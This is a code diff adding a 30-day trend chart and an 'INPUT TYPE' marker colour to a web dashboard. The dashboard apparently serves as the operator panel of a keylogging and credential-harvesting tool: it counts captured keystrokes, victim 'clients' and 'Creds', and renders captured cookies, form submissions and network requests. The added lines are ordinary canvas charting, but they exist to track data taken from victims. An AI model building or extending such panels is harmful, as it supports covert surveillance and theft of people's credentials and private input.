@@ -467,6 +467,13 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
                 <canvas id="weeklyChart" style="width:100%;height:100px;display:block"></canvas>
             </div>
         </div>
+        <div class="pnl full">
+            <div class="pnl-h"><h2>📈 30-Day Trend</h2><span style="font-size:.6rem;color:var(--dim);margin-left:6px">clients · keystrokes · visits per day</span></div>
+            <div class="pnl-b" style="padding:12px">
+                <canvas id="trendChart" style="width:100%;height:110px;display:block"></canvas>
+                <div id="trendLegend" style="display:flex;gap:14px;margin-top:6px;font-size:.58rem;color:var(--dim)"></div>
+            </div>
+        </div>
     </div>
 </div>
 
@@ -1607,7 +1614,8 @@ function renderKeystrokes(keys) {
         'COOKIES': '#fcd34d', 'PERF': '#67e8f9',
         'FORM SUBMIT': '#f97316', 'RAGE CLICK': '#ef4444',
         'NAVIGATOR': '#a5b4fc', 'FONTS': '#fda4af',
-        'WEBSOCKET': '#38bdf8', 'FETCH': '#7dd3fc', 'XHR': '#93c5fd'
+        'WEBSOCKET': '#38bdf8', 'FETCH': '#7dd3fc', 'XHR': '#93c5fd',
+        'INPUT TYPE': '#fb7185'
     };
     function colorizeMarker(text) {
         // Color special [MARKER ...] prefixes
@@ -2273,6 +2281,7 @@ function renderEvents() {
     // Update activity chart
     try { updateActivityChart(); } catch(e) {}
     try { loadHeatmap(); } catch(e) {}
+    try { loadTrend(); } catch(e) {}
 }
 
 function renderDevices() {
@@ -2847,6 +2856,80 @@ async function loadHeatmap() {
         const x = 32 + i * barW + barGap + (barW - barGap * 2) / 2;
         ctx.fillText(lbl.split('/')[0] || lbl, x, h - 8);
     });
+}
+
+// ── 30-day trend sparkline chart ────────────────────────────
+async function loadTrend() {
+    const canvas = $('#trendChart');
+    if (!canvas) return;
+    const data = await api('/api/stats/trend?days=30');
+    if (!data || !data.keys) return;
+
+    const dpr   = window.devicePixelRatio || 1;
+    const rect  = canvas.getBoundingClientRect();
+    const w     = rect.width  || canvas.offsetWidth  || 600;
+    const h     = rect.height || canvas.offsetHeight || 110;
+    canvas.width  = Math.round(w * dpr);
+    canvas.height = Math.round(h * dpr);
+    const ctx   = canvas.getContext('2d');
+    ctx.scale(dpr, dpr);
+
+    const isDark    = document.body.hasAttribute('data-dark');
+    const bgColor   = isDark ? '#1e2530' : '#f8fafc';
+    const gridColor = isDark ? 'rgba(255,255,255,.06)' : 'rgba(0,0,0,.07)';
+    ctx.fillStyle   = bgColor;
+    ctx.fillRect(0, 0, w, h);
+
+    const series = [
+        { data: data.keys,    color: '#60a5fa', label: '⌨ Keys' },
+        { data: data.visits,  color: '#4ade80', label: '🔗 Visits' },
+        { data: data.clients, color: '#f59e0b', label: '👤 New Clients' },
+        { data: data.creds,   color: '#fb923c', label: '🔑 Creds' }
+    ];
+
+    const pad   = { t: 8, r: 8, b: 20, l: 32 };
+    const pw    = w - pad.l - pad.r;
+    const ph    = h - pad.t - pad.b;
+    const n     = data.days;
+    const allVals = series.flatMap(s => s.data);
+    const maxVal  = Math.max(...allVals, 1);
+
+    // Grid lines
+    [0.25, 0.5, 0.75, 1].forEach(f => {
+        const y = pad.t + ph * (1 - f);
+        ctx.strokeStyle = gridColor; ctx.lineWidth = 1;
+        ctx.beginPath(); ctx.moveTo(pad.l, y); ctx.lineTo(pad.l + pw, y); ctx.stroke();
+        ctx.fillStyle = isDark ? '#556' : '#aaa'; ctx.font = '10px Consolas'; ctx.textAlign = 'right';
+        ctx.fillText(Math.round(maxVal * f), pad.l - 4, y + 3);
+    });
+
+    // Draw each series as a line
+    series.forEach(({ data: vals, color }) => {
+        if (!vals.some(v => v > 0)) return;
+        ctx.strokeStyle = color; ctx.lineWidth = 1.5; ctx.globalAlpha = 0.85;
+        ctx.beginPath();
+        vals.forEach((v, i) => {
+            const x = pad.l + (i / (n - 1)) * pw;
+            const y = pad.t + ph * (1 - v / maxVal);
+            i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
+        });
+        ctx.stroke();
+        ctx.globalAlpha = 1;
+    });
+
+    // X-axis day labels (every ~7 days)
+    ctx.fillStyle = isDark ? '#778' : '#888'; ctx.font = '10px Consolas'; ctx.textAlign = 'center';
+    data.labels.forEach((lbl, i) => {
+        if (i % 7 !== 0 && i !== n - 1) return;
+        const x = pad.l + (i / (n - 1)) * pw;
+        ctx.fillText(lbl, x, h - 4);
+    });
+
+    // Legend
+    const legend = $('#trendLegend');
+    if (legend) {
+        legend.innerHTML = series.map(s => `<span style="color:${s.color}">${s.label}</span>`).join('');
+    }
 }
 
 function updateActivityChart() {
